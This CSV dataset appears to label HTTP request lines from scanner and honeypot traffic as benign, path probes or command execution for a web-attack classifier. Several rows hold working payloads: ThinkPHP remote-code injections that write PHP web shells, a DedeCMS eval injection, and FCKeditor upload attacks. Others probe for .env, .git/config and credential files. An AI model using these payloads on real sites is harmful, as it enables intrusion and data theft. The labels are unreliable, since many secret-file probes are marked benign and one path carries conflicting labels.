text,label
METHOD=HEAD PATH=/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/backup.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/images/vuln.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/application.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/restore/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/secrepo.com.tar.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/index.php QUERY=s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/backup/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/back/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/directory.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/ups.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/backups/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/bak/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/bak/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
"METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();// PROTOCOL=HTTP/1.1",command_exec
METHOD=HEAD PATH=/old/directory.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=POST PATH=/FCKeditor/editor/filemanager/connectors/asp/connector.asp QUERY=Command=FileUpload&Type=File&CurrentFolder=/ PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/back/application.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/Datasets Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/assets/plugins/fileupload/server/php/index.php QUERY=file=tf2rghf.jpg PROTOCOL=HTTP/1.1,command_exec
METHOD=GET PATH=/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/restore/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/application.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/honeypot/bsidesdfw - 2014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/public_html.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/latest.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/www.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/.git/config QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/directory.tar.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
"METHOD=GET PATH=/ QUERY=s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$ PROTOCOL=HTTP/1.1",command_exec
METHOD=HEAD PATH=/back/www.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/sites/all/libraries/elfinder/elfinder.php.html QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/restore/directory.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/sftp-config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/mysql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/latest.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
"METHOD=GET PATH=/ QUERY=s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?> PROTOCOL=HTTP/1.1",command_exec
METHOD=HEAD PATH=/restore/bak.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/back/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/bak.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/media-admin.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/Archive.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/wordpress/ QUERY= PROTOCOL=HTTP/1.1,benign
